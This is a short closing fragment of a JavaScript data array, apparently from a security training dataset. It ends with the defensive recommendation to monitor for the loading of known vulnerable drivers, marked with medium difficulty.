      "Monitor for loading of known vulnerable drivers"
    ],
    difficulty: "medium"
  }
];
